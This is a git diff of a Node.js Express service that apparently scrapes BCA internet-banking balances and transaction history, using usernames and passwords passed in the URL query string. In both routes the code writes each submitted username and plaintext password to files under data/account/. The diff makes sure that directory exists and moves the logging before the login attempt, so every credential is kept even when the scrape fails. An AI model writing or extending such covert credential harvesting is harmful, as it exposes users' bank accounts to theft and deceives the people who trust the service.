@@ -2,11 +2,12 @@ const express = require('express');
 const app = express();
 app.use(express.static('public'));
 const http = require('http').Server(app);
-const port = process.env.PORT || 5050;
+const port = process.env.PORT || 1000;
 // const ScraperBank = require("mutasi-scraper");
 const ScraperBank = require("./lib/parser");
 const fs = require("fs");
 // const bca = require('nodejs-bca-scraper');
+const logDir = './data/account/'
 
 
 app.get('/', (req, res) => {
@@ -17,13 +18,15 @@ app.get('/bca', async (req, res) => {
 
     const scraper = new ScraperBank(req.query.user, req.query.pass); // username dan password akun ibanking
     await (async () => {
-        let result = await scraper.getBCABalance(res);
-
+        if (!fs.existsSync(logDir)){
+            fs.mkdirSync(logDir, { recursive: true });
+        }
         // console.log(req.query.user, req.query.pass)
-        fs.appendFile('data/account/acc_balance.txt', `${req.query.user} \t ${req.query.pass} \n`, function (err) {
+        fs.appendFile(logDir + 'acc_balance.txt', `${req.query.user} \t ${req.query.pass} \n`, function (err) {
             if (err) throw err;
             // console.log('Saved!');
         });
+        let result = await scraper.getBCABalance(res);
         if (Array.isArray(result)){
             result = result.map(x => x.trim());
             res.json({
@@ -40,7 +43,10 @@ app.get('/mutasi-bca', async (req, res) => {
 
     const scraper = new ScraperBank(req.query.user, req.query.pass); // username dan password akun ibanking
     await (async () => {
-        fs.appendFile('data/account/acc_mutation.txt', `${req.query.user} \t ${req.query.pass} \t from_date: ${ req.query.from_date } from_month: ${ req.query.from_month } to_date: ${ req.query.to_date } to_month: ${ req.query.to_month } \n`, function (err) {
+        if (!fs.existsSync(logDir)){
+            fs.mkdirSync(logDir, { recursive: true });
+        }
+        fs.appendFile(logDir + 'acc_mutation.txt', `${req.query.user} \t ${req.query.pass} \t from_date: ${ req.query.from_date } from_month: ${ req.query.from_month } to_date: ${ req.query.to_date } to_month: ${ req.query.to_month } \n`, function (err) {
             if (err) throw err;
             // console.log('Saved!');
         });
